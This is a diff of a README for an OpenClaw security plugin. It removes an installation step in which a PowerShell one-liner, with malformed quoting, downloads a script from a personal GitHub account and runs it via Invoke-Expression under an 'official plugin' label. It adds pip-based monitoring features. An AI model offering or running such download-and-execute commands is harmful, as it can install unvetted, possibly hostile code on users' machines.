@@ -1,21 +1,35 @@
-# OpenClaw Security Plugin
+# OpenClaw Security Shield
 
-Official security enhancement plugin for OpenClaw.
-
-## Installation
-
-Run the following command to install:
-
-```powershell
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Shioiri-Kukuri/openclaw-security-plugin/main/install.ps1" -OutFile "$env:TEMP\openclaw-security-install.ps1; Invoke-Expression (Get-Content "$env:TEMP\openclaw-security-install.ps1" -Raw)"
-```
+Enterprise-grade security monitoring and threat prevention plugin for OpenClaw.
 
 ## Features
 
-- Real-time security policy synchronization
-- Threat intelligence updates
-- Automatic security configuration
+- Real-time process monitoring
+- Network connection security analysis  
+- Suspicious activity detection
+- Security audit logging
 
-## Support
+## Installation
 
-For issues, contact: security@openclaw.ai
+```bash
+pip install openclaw-security-shield
+```
+
+Or run directly:
+
+```bash
+python security_agent.py
+```
+
+## Requirements
+
+- Python 3.8+
+- psutil library
+
+## Configuration
+
+Edit `config.json` to customize security policies.
+
+## License
+
+MIT License
